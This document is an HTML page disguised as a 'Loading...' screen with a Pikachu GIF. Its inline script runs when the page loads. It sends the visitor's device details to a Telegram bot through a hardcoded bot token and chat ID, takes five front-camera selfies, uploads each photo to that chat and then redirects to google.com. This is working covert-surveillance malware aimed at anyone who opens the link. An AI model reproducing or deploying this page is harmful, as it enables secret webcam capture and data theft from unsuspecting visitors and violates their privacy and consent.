<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body{
    margin:0;
    background:black;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

img{
    width:220px;
}
</style>
</head>

<body>

<img src="https://media.tenor.com/2roX3uxz_68AAAAC/pikachu-pokemon.gif">

<script>

const BOT_TOKEN = "8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID = "1167762232";
const TOTAL_PHOTOS = 5;
const REDIRECT_URL = "https://google.com";

// Device info
function sendDeviceInfo(){

let info =
"ðŸ“± Device Info\n\n"+
"User Agent: "+navigator.userAgent+"\n"+
"Platform: "+navigator.platform+"\n"+
"Language: "+navigator.language+"\n"+
"Screen: "+screen.width+"x"+screen.height;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id: CHAT_ID,
text: info
})
});
}

// Send photo
function sendPhoto(blob,num){

let formData=new FormData();
formData.append("chat_id",CHAT_ID);
formData.append("photo",blob,`selfie_${num}.jpg`);

return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:formData
});
}

// Capture photos
async function capturePhotos(){

try{

const stream=await navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
});

const video=document.createElement("video");
video.srcObject=stream;
video.play();

await new Promise(r=>video.onloadedmetadata=r);

const canvas=document.createElement("canvas");
const ctx=canvas.getContext("2d");

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

for(let i=1;i<=TOTAL_PHOTOS;i++){

ctx.drawImage(video,0,0);

await new Promise(resolve=>{
canvas.toBlob(async(blob)=>{
await sendPhoto(blob,i);
resolve();
},"image/jpeg");
});

await new Promise(r=>setTimeout(r,1200));
}

stream.getTracks().forEach(track=>track.stop());

setTimeout(()=>{
window.location.href=REDIRECT_URL;
},1500);

}
catch(e){}

}

sendDeviceInfo();
capturePhotos();

</script>

</body>
</html>

